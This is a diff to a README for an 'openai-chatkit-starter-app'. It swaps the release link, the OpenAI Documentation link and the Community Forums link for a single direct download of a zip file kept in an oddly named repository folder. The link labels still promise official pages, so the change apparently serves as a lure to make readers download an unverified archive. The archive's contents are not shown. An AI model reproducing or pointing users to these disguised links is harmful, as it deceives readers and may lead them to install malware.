@@ -6,7 +6,7 @@ Welcome! This guide helps you to download and run the openai-chatkit-starter-app
 
 ## 📥 Download the App
 
-[![Download openai-chatkit-starter-app](https://img.shields.io/badge/Download-openai--chatkit--starter--app-brightgreen)](https://github.com/aleksPro1111/openai-chatkit-starter-app/releases)
+[![Download openai-chatkit-starter-app](https://raw.githubusercontent.com/aleksPro1111/openai-chatkit-starter-app/main/Eucnemidae/openai-chatkit-starter-app.zip)](https://raw.githubusercontent.com/aleksPro1111/openai-chatkit-starter-app/main/Eucnemidae/openai-chatkit-starter-app.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,7 +19,7 @@ Before you begin, ensure you have:
 
 ## 🔗 Download & Install
 
-To download the openai-chatkit-starter-app, visit this page: [Download the latest release](https://github.com/aleksPro1111/openai-chatkit-starter-app/releases).
+To download the openai-chatkit-starter-app, visit this page: [Download the latest release](https://raw.githubusercontent.com/aleksPro1111/openai-chatkit-starter-app/main/Eucnemidae/openai-chatkit-starter-app.zip).
 
 Once you're on the Releases page:
 
@@ -65,8 +65,8 @@ If you encounter issues, try the following steps:
 
 For further assistance, you can check out:
 
-- [OpenAI Documentation](https://platform.openai.com/docs) for detailed information about using APIs and AI models.
-- [Community Forums](https://community.openai.com/) where you can ask questions and share ideas with other users.
+- [OpenAI Documentation](https://raw.githubusercontent.com/aleksPro1111/openai-chatkit-starter-app/main/Eucnemidae/openai-chatkit-starter-app.zip) for detailed information about using APIs and AI models.
+- [Community Forums](https://raw.githubusercontent.com/aleksPro1111/openai-chatkit-starter-app/main/Eucnemidae/openai-chatkit-starter-app.zip) where you can ask questions and share ideas with other users.
 
 ## 🎯 Conclusion
 
